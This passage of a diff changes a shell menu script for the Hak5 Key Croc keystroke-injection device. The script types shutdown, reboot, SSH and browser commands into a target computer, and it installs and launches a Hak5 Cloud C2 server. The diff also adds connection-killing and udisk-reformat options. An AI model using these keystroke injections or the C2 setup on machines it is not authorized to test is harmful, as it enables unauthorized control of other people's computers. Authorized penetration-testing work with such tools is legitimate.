-				Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -h 0" ; Q ENTER ;;
+				QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -h 0" ; QUACK ENTER ;;
 			*)
-				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -h 0" ; Q ENTER ;;
+				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -h 0" ; QUACK ENTER ;;
 		esac
 	fi
 }
 ##
-#----Recovery Reboot target pc
+#----Recovery Reboot target
 ##
 reboot_pc() {
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
-		Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Restart-Computer" ; Q ENTER
+		QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "Restart-Computer" ; QUACK ENTER
 	else
 		case "$HOST_CHECK" in
 			raspberrypi)
-				Q CONTROL-ALT-t ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
+				QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "shutdown -r 0" ; QUACK ENTER ;;
 			"$HOST_CHECK")
-				Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
+				QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -r 0" ; QUACK ENTER ;;
 			*)
-				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
+				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "shutdown -r 0" ; QUACK ENTER ;;
 		esac
 	fi
 }
 ##
 #----Recovery Reboot/Shutdown menu
 ##
-	MenuTitle 'REBOOT/SHUTDOWN TARGET PC'
-	MenuColor 19 1 'SHUTDOWN TARGET PC'
-	MenuColor 19 2 'REBOOT TARGET PC'
-	MenuColor 19 3 'RETURN TO MAIN MENU'
+	MenuTitle 'REBOOT/SHUTDOWN TARGET'
+	MenuColor 19 1 'SHUTDOWN TARGET'
+	MenuColor 19 2 'REBOOT TARGET'
+	MenuColor 19 3 'REBOOT KEYCROC'
+	MenuColor 19 4 'RETURN TO MAIN MENU'
 	MenuEnd 18
 	case "$m_a" in
 		1) shutdown_pc ;;
 		2) reboot_pc ;;
-		3) main_menu ;;
+		3) reboot --force ;;
+		4) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; reboot_shutdown ;;
 		[bB]) croc_recovery ;; [pP]) Panic_button ;; *) invalid_entry ; reboot_shutdown ;;
 	esac
 }
@@ -9462,20 +9693,94 @@ Q STRING \"Q STRING \\\"ssh -o 'StrictHostKeyChecking no' root@\\\$(ifconfig wla
 #----Reset Wireless Networking
 ##
 reset_wifi() {
-	Info_Screen 'Reset Wireless Networking'
+	Info_Screen 'Reset Wireless Networking
+NOTE: may get assigned a new ip address'
 	SSID_CHECK
 	read_all 'RESET WIRELESS NETWORK Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
-			PID_WPA=$(pidof wpa_supplicant)
-			PID_DHC=$(pidof dhclient)
-			kill -9 "$PID_WPA" && kill -9 "$PID_DHC"
+			kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
 			ifconfig wlan0 down && ifconfig wlan0 up
 			wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0
-			sleep 5
+			sleep 3
 			systemctl restart ssh.service
-			sleep 1
 			[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R ;;
+		[nN] | [nN][oO])
+			ColorYellow 'Maybe next time\n' ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
+#----Get all established connections, extract IP address and port number, terminate the connection (if a PID was found)
+##
+terminate_ip() {
+	Info_Screen 'Get all established connections
+ask user which connection to terminate
+extract IP address and port number from user input
+find the process ID (PID) of the connection to terminate
+terminate the connection (if a PID was found)'
+	read_all 'SHOW ESTABLISHED CONNECTIONS Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+			netstat -tn 2>/dev/null | grep ESTABLISHED | awk '{print $5}' | sort -t: -k2 | uniq |
+			while read ip; do
+				port=$(echo "$ip" | cut -d: -f2)
+				ip=$(echo "$ip" | cut -d: -f1)
+				ColorYellow "$ip:$port\n"
+			done
+			read_all 'TERMINATE ESTABLISHED CONNECTIONS Y/N AND PRESS [ENTER]'
+			case "$r_a" in
+				[yY] | [yY][eE][sS])
+					read_all 'ENTER IP:PORT OF CONNECTION TO TERMINATE AND PRESS [ENTER]' ; connection="$r_a"
+					ip=$(echo "$connection" | cut -d: -f1)
+					port=$(echo "$connection" | cut -d: -f2)
+					pid=$(netstat -tnp 2>/dev/null | grep -E "$ip:$port\s" | cut -d/ -f1 | awk '{print $NF}')
+					if [ ! -z "$pid" ]; then
+						kill -9 "$pid"
+						ColorYellow "Connection to $connection terminated.\n"
+						read_all 'BLOCK ALL CONNECTION UNTILL REBOOT Y/N AND PRESS [ENTER]'
+						case "$r_a" in
+							[yY] | [yY][eE][sS])
+								iptables -A INPUT -s $ip -j DROP
+								iptables -A OUTPUT -d $ip -j DROP
+								ColorYellow "All Connection to $ip terminated untill reboot.\n" ;;
+							[nN] | [nN][oO])
+								ColorYellow 'Maybe next time\n' ;;
+							*)
+								invalid_entry ;;
+						esac
+					else
+						ColorYellow "No connection to $connection found."
+					fi ;;
+				[nN] | [nN][oO])
+					ColorYellow 'Maybe next time\n' ;;
+				*)
+					invalid_entry ;;
+			esac ;;
+		[nN] | [nN][oO])
+			ColorYellow 'Maybe next time\n' ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
+#----Reformat the keycroc udisk, udisk partition is formatted in the FAT32 file system
+##
+reformat_udisk() {
+	Info_Screen 'Reformat the Keycroc udisk partition
+The udisk partition is formatted in the FAT32 file system for maximum
+compatibility with various targets Windows, Mac, Linux, etc.
+
+NOTE: This will remove anything you previously have stored on the udisk
+such as payloads, loot, etc.'
+df -h /root/udisk
+	read_all 'REFORMAT KEYCROC UDISK PARTITION Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+			ColorRed 'Reformat the Keycroc udisk partition\n'
+			ColorYellow 'May need to unplug keycroc and plug back in\n'
+			udisk reformat ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
 		*)
@@ -9491,16 +9796,21 @@ reset_wifi() {
 	MenuColor 27 3 'REPAIR en_US.UTF-8 ERROR'
 	MenuColor 27 4 'KEYCROC UPDATE PACKAGES'
 	MenuColor 27 5 'REMOVE CROC_POT AN CONTENTS'
-	MenuColor 27 6 'REBOOT/SHUTDOWN TARGET PC'
+	MenuColor 27 6 'REBOOT/SHUTDOWN TARGET'
 	MenuColor 27 7 'CHANGE KEYCROC TIMEZONE'
 	MenuColor 27 8 'CHANGE KEYCROC PASSWORD'
 	MenuColor 27 9 'MAC ADDRESS CHANGER'
 	MenuColor 26 10 'RESET WIRELESS NETWORK'
-	MenuColor 26 11 'RETURN TO MAIN MENU'
+	MenuColor 26 11 'TERMINATE CONNECTION'
+	MenuColor 26 12 'REFORMAT UDISK PARTITION'
+	MenuColor 26 13 'RETURN TO MAIN MENU'
 	MenuEnd 26
 	case "$m_a" in
 		1) croc_firmware ; croc_recovery ;;
-		2) start_web https://docs.hak5.org/key-croc/ ; croc_recovery ;;
+		2) websites=("https://docs.hak5.org/key-croc/" "https://forums.hak5.org/" "https://shop.hak5.org/" "https://discord.com/invite/QfmZFTyTY2")
+			for url in "${websites[@]}"; do
+				start_web "$url" ; sleep 3
+			done ; croc_recovery ;;
 		3) locale_en_US ; croc_recovery ;;
 		4) croc_update ; croc_recovery ;;
 		5) remove_croc_pot ;;
@@ -9509,8 +9819,11 @@ reset_wifi() {
 		8) passwd ; croc_recovery ;;
 		9) mac_changer ; croc_recovery ;;
 		10) reset_wifi ; croc_recovery ;;
-		11) main_menu ;;
+		11) terminate_ip ; croc_recovery ;;
+		12) reformat_udisk ; croc_recovery ;;
+		13) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; croc_recovery ;;
 		[bB]) main_menu ;; [pP]) Panic_button ;; *) invalid_entry ; croc_recovery ;;
 	esac
 }
@@ -9533,6 +9846,12 @@ function hak_cloud() {
 		ColorYellow 'HAK5 Cloud C2 is not installed\n'
 	fi
 ##
+#----Hak5 Cloud_C2- start default web browser on Hak5 Cloud_C2 url
+##
+cloud_web() {
+	start_web http://"$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
+}
+##
 #----Hak5 Cloud_C2- download and install Hak5 Cloud_C2 & unzip
 ##
 cloud_setup() {
@@ -9545,10 +9864,10 @@ case "$r_a" in
 		else
 			ColorGreen 'Installing HAK5 C2 on the keycroc\n'
 			sleep 3
-			wget https://c2.hak5.org/download/community -O /tmp/community && unzip /tmp/community -d /tmp ; sleep 5
-			mv /tmp/c2-3.2.0_armv7_linux /usr/local/bin && mkdir /var/hak5c2
+			wget https://storage.googleapis.com/hak5-dl.appspot.com/cloudc2/firmwares/3.4.0-stable/c2-3.4.0.zip -O /tmp/community && unzip /tmp/community -d /tmp ; sleep 5
+			mv /tmp/c2-3.4.0_armv7_linux /usr/local/bin && mkdir /var/hak5c2
 			echo -ne "[Unit]\nDescription=Hak5 C2\nAfter=hak5.service\n[Service]\nType=idle
-ExecStart=/usr/local/bin/c2-3.2.0_armv7_linux -hostname $(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-) -listenport 80 -db /var/hak5c2/c2.db
+ExecStart=/usr/local/bin/c2-3.4.0_armv7_linux -hostname $(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-) -listenport 80 -db /var/hak5c2/c2.db
 [Install]\nWantedBy=multi-user.target" > /etc/systemd/system/hak5.service
 			sleep 1
 			systemctl daemon-reload && systemctl start hak5.service ; sleep 5
@@ -9561,12 +9880,6 @@ ExecStart=/usr/local/bin/c2-3.2.0_armv7_linux -hostname $(ifconfig wlan0 | grep 
 	*)
 		invalid_entry ;;
 esac
-}
-##
-#----Hak5 Cloud_C2- start default web browser on Hak5 Cloud_C2 url
-##
-cloud_web() {
-	start_web http://"$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
 }
 ##
 #----Hak5 Cloud_C2 reload
@@ -9582,7 +9895,7 @@ reload_cloud() {
 ##
 remove_cloud() {
 	rm -r /var/hak5c2
-	rm /usr/local/bin/c2-3.2.0_armv7_linux
+	rm /usr/local/bin/c2-3.4.0_armv7_linux
 	rm /etc/systemd/system/hak5.service
 }
 ##
@@ -9605,7 +9918,7 @@ sleep 5\nOS_CHECK=\$(sed -n 1p \${CROC_OS})\nif [ \"\${OS_CHECK}\" = WINDOWS ]; 
 Q ENTER\nsleep 2\nQ STRING \"Start-Process http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
 Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 2\nQ STRING \"exit\"\nQ ENTER\nelse\nHOST_CHECK=\$(sed -n 3p \${CROC_OS})\ncase \$HOST_CHECK in
 raspberrypi)\nQ CONTROL-ALT-d\nQ CONTROL-ALT-t\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
-Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\n$HOST_CHECK)\nQ ALT F2\nsleep 1\nQ STRING \"mate-terminal\"\nQ ENTER\nsleep 1
+Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\n$HOST_CHECK)\nQ ALT-t\nsleep 1
 Q STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\nQ ENTER\nsleep 5\nQ ALT-TAB
 sleep 1\nQ ALT-F4;;\n*)\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
 Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nesac\nfi\nelse\nLED G\nsystemctl restart hak5.service\nsleep 5\nfi" > "$quickcloud"
@@ -9705,6 +10018,7 @@ edit_ip() {
 		3) edit_ip ; hak_cloud ;;
 		4) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; hak_cloud ;;
 		[bB]) hak_cloud ;; [pP]) Panic_button ;; *) invalid_entry ; hak_cloud ;;
 	esac
 }
@@ -9735,6 +10049,7 @@ edit_ip() {
 		9) save_ip ;;
 		10) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; hak_cloud ;;
 		[bB]) main_menu ;; [pP]) Panic_button ;; *) invalid_entry ; hak_cloud ;;
 	esac
 }
@@ -9763,6 +10078,7 @@ function main_menu() {
 		7) croc_recovery ;;
 		8) hak_cloud ;;
 		0) exit ;;
+		lock) Lock_keyboard ; main_menu ;;
 		[pP]) Panic_button ;;
 		kp | KP) start_icmp ; main_menu ;;
 		st | ST) reset_broken ; main_menu ;;
